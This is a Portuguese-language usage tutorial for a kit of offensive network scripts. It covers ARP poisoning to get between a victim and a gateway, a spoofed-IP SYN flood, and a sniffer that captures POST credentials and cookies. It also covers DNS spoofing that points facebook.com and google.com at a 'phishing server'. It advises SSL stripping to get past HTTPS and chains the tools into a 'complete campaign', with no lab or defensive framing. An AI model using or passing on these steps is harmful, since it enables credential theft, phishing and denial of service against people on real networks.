# Network — Tutorial

> Scripts que requerem root: `arp_spoof.py`, `syn_flood.py`, `mitm_sniffer.py`, `dns_spoof.py`  
> Plataforma: **Linux** (scapy nao funciona bem no Windows para raw sockets)

## Dependencias
```bash
pip install scapy
echo 1 > /proc/sys/net/ipv4/ip_forward   # habilita IP forwarding (MITM)
```

---

## arp_spoof.py
ARP poisoning — se posiciona entre vitima e gateway (MITM).

```bash
# Passo 1: habilitar forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Passo 2: rodar
python arp_spoof.py
# Interface: eth0
# Victim IP: 192.168.1.50
# Gateway IP: 192.168.1.1
# Interval: 1.5
```

Ctrl+C restaura as tabelas ARP automaticamente.  
Em MITM, combine com `mitm_sniffer.py` em outro terminal.

---

## syn_flood.py
SYN flood com IPs spoofados — esgota a tabela de conexoes do alvo.

```bash
python syn_flood.py
# Target IP: 192.168.1.100
# Target port: 80
# Threads: 100
```

Efetivo contra alvos sem SYN cookies habilitado.

---

## mitm_sniffer.py
Sniffa credenciais e cookies HTTP em trânsito. Executar APOS arp_spoof.

```bash
# Terminal 1:
python arp_spoof.py     # MITM ativo

# Terminal 2:
python mitm_sniffer.py
# Interface: eth0
```

Captura:
- Credenciais em campos POST (user, pass, email, password, etc)
- Cabecalhos `Cookie:` completos

> Trafego HTTPS e criptografado — use `sslstrip` ou evil_twin com SSL stripping para HTTPS.

---

## dns_spoof.py
Redireciona dominios especificos para IP controlado pelo atacante.

```bash
# Requer estar em posicao MITM primeiro (rodar arp_spoof.py)

python dns_spoof.py
# Interface: eth0
# Domain: facebook.com -> 192.168.1.10   (seu phishing server)
# Domain: google.com   -> 192.168.1.10
# Domain: (enter para comecar)
```

Combine: arp_spoof + dns_spoof + evil_twin + phishing_page = campanha completa.
